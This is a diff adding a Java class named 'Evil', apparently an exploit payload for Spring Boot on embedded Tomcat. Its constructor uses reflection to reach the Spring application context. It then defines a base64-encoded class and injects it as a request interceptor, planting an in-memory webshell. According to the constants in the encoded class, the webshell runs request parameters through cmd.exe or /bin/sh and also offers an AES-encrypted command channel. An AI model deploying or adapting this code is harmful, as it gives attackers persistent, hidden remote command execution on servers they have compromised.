@@ -1,0 +1,67 @@
+package artsploit;
+
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.Base64;
+
+public class Evil {
+    public Evil() throws Exception {
+        // 从当前线程取出上下文，适用于多线程情况 -> 会报奇怪的错，还是反射调用吧
+        // Context tomcatEmbeddedContext = ((TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader()).getResources().getContext();
+        ClassLoader tomcatClassLoader = Thread.currentThread().getContextClassLoader();
+        Method getResources = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getMethod("getResources");
+
+
+        Object resources = getResources.invoke(tomcatClassLoader);
+        Method getContext = getResources.invoke(tomcatClassLoader).getClass().getMethod("getContext");
+        Object tomcatEmbeddedContext = (Object) getContext.invoke(resources);
+
+
+        // 取出 ApplicationContext
+        Field contextField = getContext.invoke(resources).getClass().getSuperclass().getDeclaredField("context");
+        contextField.setAccessible(true);
+
+        Object applicationContext = (Object) contextField.get(tomcatEmbeddedContext);
+        Method getAttribute = contextField.get(tomcatEmbeddedContext).getClass().getMethod("getAttribute", String.class);
+
+        Object webApplicationContext = (Object) getAttribute.invoke(applicationContext, "org.springframework.web.context.WebApplicationContext.ROOT");
+        Class<?> abstractApplicationContext = getAttribute.invoke(applicationContext, "org.springframework.web.context.WebApplicationContext.ROOT").getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+
+
+        Method getBean = abstractApplicationContext.getMethod("getBean", String.class);
+        Method getBeanDefinitionNames = abstractApplicationContext.getMethod("getBeanDefinitionNames");
+
+        // 测试输出所有 Bean 成功
+//            Object[] result = (Object[]) getBeanDefinitionNames.invoke(webApplicationContext);
+//            for(Object r:result){
+//                System.out.println(r.toString());
+//            }
+
+        // 单例模式，不能用 getBean -> SingletonObjects
+        Object abstractHandlerMapping = getBean.invoke(webApplicationContext, "requestMappingHandlerMapping");
+        // 反射获取adaptedInterceptors属性
+        Field field = getBean.invoke(webApplicationContext, "requestMappingHandlerMapping").getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adaptedInterceptors");
+
+        field.setAccessible(true);
+        System.out.println("1ok");
+        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);
+        for (Object i : adaptedInterceptors) {
+            if (i.getClass().getName().contains("TestInterceptor")) {
+                return;
+            }
+        }
+
+        // 获取主线程的类加载器
+        Method getParentCLassLoader = getContext.invoke(resources).getClass().getMethod("getParentClassLoader");
+        ClassLoader parentClassLoader = (ClassLoader) getParentCLassLoader.invoke(tomcatEmbeddedContext);
+        Class<?> madaoClass = defineClass(parentClassLoader, "yv66vgAAADQBNwoAUQCQCACRCQA+AJIKAAUAkwcAlAgAYgcAlQcAXwkAlgCXCgAHAJgKABIAmQgAZAoABwCaCgCbAJwKAJ0AngcAnwoAmwCgBwChCgCWAKIKAJ0AowgAggsApAClCwCkAKYIAKcKACIAqAsAqQCqCACrCACsCgCtAK4KACIArwgAsAoAIgCxBwCyBwCzCAC0CAC1CgAhALYIALcIALgHALkKACEAugoAuwC8CgAoAL0IAL4KACgAvwoAKADACgAoAMEKACgAwgoAwwDECgDDAMUKAMMAwggAxgsApADHCADICwDJAMoIAMsKAMwAzQcAzgoAIgDPCgA6ANAKAMwA0QcA0goAPgCQCwCkANMKANQA1QkArQDWCgDXANgHANkKAEQAkAoARADaCgDMANsKAD4A3AcA3QoASQCQCABxCwDeAN8IAHwIAH4KAAcA4AoAEgCoBwDhAQABawEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADUNvbnN0YW50VmFsdWUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAG0xhcnRzcGxvaXQvVGVzdEludGVyY2VwdG9yOwEAAWcBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAFiAQACW0IBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEACW1vZGlmaWVycwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAApFeGNlcHRpb25zBwDiAQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAAW8BAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAD3Rlc3RJbnRlcmNlcHRvcgEADGJhc2U2NFN0cmluZwEADmJ5dGVzRW5jcnlwdGVkAQAOYnl0ZXNEZWNyeXB0ZWQBAAhuZXdDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALcGFnZUNvbnRleHQBAA9MamF2YS91dGlsL01hcDsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA2NtZAEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwEADVN0YWNrTWFwVGFibGUHALMHAOMHALIHALkHANIHAOQHAOUHAKEBAApTb3VyY2VGaWxlAQAUVGVzdEludGVyY2VwdG9yLmphdmEMAFUAVgEAEGU0NWUzMjlmZWI1ZDkyNWIMAFIAUwwA5gDnAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAPamF2YS9sYW5nL0NsYXNzBwDoDADpAHkMAOoA6wwA7ADtDADuAO8HAPAMAPEA8gcA8wwA9AD1AQAaamF2YS9sYW5nL3JlZmxlY3QvTW9kaWZpZXIMAPYA9wEAEGphdmEvbGFuZy9PYmplY3QMAPgA+QwA+gD7BwDkDAD8AP0MAP4A/wEAA0dFVAwBAAEBBwDlDAECAQMBAAABAAdvcy5uYW1lBwEEDAEFAP0MAQYA/wEAA3dpbgwBBwEIAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAVQEJAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAQoBCwcBDAwBDQEODABVAQ8BAAJcQQwBEAERDAESARMMARQA/wwBFQBWBwDjDAEWARcMARgAVgEABFBPU1QMARkBGgEAAXUHARsMARwBHQEAA0FFUwcBHgwBHwEgAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBIQEiDABVASMMASQBJQEAGWFydHNwbG9pdC9UZXN0SW50ZXJjZXB0b3IMASYBJwcBKAwBKQD/DAEqASsHASwMAS0BFwEAKm9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvY29kZWMvYmluYXJ5L0Jhc2U2NAwBLgEvDAEwATEMAFwAXQEAEWphdmEvdXRpbC9IYXNoTWFwBwEyDAEzATQMATUBNgEAQW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9IYW5kbGVySW50ZXJjZXB0b3JBZGFwdGVyAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABRnZXRTeXN0ZW1DbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEADGdldE1vZGlmaWVycwEAAygpSQEABnNldEludAEAFihMamF2YS9sYW5nL09iamVjdDtJKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0TWV0aG9kAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEABWNsb3NlAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZG9GaW5hbAEABihbQilbQgEADWphdmEvdXRpbC9NYXABAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsAIQA+AFEAAAABABIAUgBTAAEAVAAAAAIAAgADAAEAVQBWAAEAVwAAADkAAgABAAAACyq3AAEqEgK1AAOxAAAAAgBYAAAACgACAAAAGgAEABsAWQAAAAwAAQAAAAsAWgBbAAAAAQBcAF0AAgBXAAAAygAGAAUAAABkuAAETRIFEgYGvQAHWQMSCFNZBLIACVNZBbIACVO2AApOLbYACxIMtgANOgQZBAS2AA4ZBC0ttgAPEO9+EPd+BIC2ABEtLAa9ABJZAytTWQQDuAATU1kFK764ABNTtgAUwAAHsAAAAAIAWAAAABoABgAAAB8ABAAgACEAIQAsACIAMgAjAEQAJQBZAAAANAAFAAAAZABaAFsAAAAAAGQAXgBfAAEABABgAGAAYQACACEAQwBiAGMAAwAsADgAZABlAAQAZgAAAAQAAQBnAAEAaABpAAIAVwAAAw0ABgANAAABdisSFbkAFgIAOgQZBMYAqyu5ABcBABIYtgAZmQCdLLkAGgEAOgUSGzoGEhy4AB22AB4SH7YAIJkAIrsAIVkGvQAiWQMSI1NZBBIkU1kFGQRTtwAlOgenAB+7ACFZBr0AIlkDEiZTWQQSJ1NZBRkEU7cAJToHuwAoWRkHtgAptgAqtwArEiy2AC06CBkItgAumQALGQi2AC+nAAUZBjoGGQi2ADAZBRkGtgAxGQW2ADIZBbYAM6cAwBkExgC7K7kAFwEAEjS2ABmZAK0ruQA1AQA6BRkFEjYqtgALVxICuQA3AwASOLgAOToGGQYFuwA6WSq2AAtXEgK2ADsSOLcAPLYAPbsAPlm3AD86Byu5AEABALYAQToIsgBCGQi2AEO7AERZtwBFGQi2AEY6CRkGGQm2AEc6ChkHGQq2AEg6C7sASVm3AEo6DBkMEksZBbkATAMAVxkMEk0ruQBMAwBXGQwSTiy5AEwDAFcZC7YATxkMtgBQVwSsAAAABABYAAAAegAeAAAAKQAKACoAHQArACUALAApAC4AOQAvAFgAMQB0ADMAigA0AJ4ANQCjADYAqgA3AK8AOAC0ADkAygA6ANIAOwDiADwA6QA9AQIAPwELAEABFgBBAR4AQgEsAEMBNQBEAT4ARgFHAEcBUwBIAV4ASQFpAEoBdABMAFkAAAC2ABIAVQADAGoAawAHACUAjwBsAG0ABQApAIsAbgBTAAYAdABAAGoAawAHAIoAKgBvAHAACADSAKIAcQByAAUA6QCLAG8AcwAGAQsAaQB0AFsABwEWAF4AdQBTAAgBLABIAHYAXwAJATUAPwB3AF8ACgE+ADYAeAB5AAsBRwAtAHoAewAMAAABdgBaAFsAAAAAAXYAfAB9AAEAAAF2AH4AfwACAAABdgCAAIEAAwAKAWwAggBTAAQAgwAAAAwAAQFHAC0AegCEAAwAhQAAADcABv4AWAcAhgcAhwcAhvwAGwcAiPwAJQcAiUEHAIb/ABoABQcAigcAiwcAjAcAjQcAhgAA+wC8AGYAAAAEAAEAZwABAI4AAAACAI8=");
+        adaptedInterceptors.add(madaoClass.newInstance());
+    }
+
+    public static Class defineClass(ClassLoader classLoader, String classByte) throws Exception {
+        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
+        defineClass.setAccessible(true);
+        byte[] evalBytes = Base64.getDecoder().decode(classByte);
+        return (Class<?>) defineClass.invoke(classLoader, new Object[]{evalBytes, 0, evalBytes.length});
+    }
+}
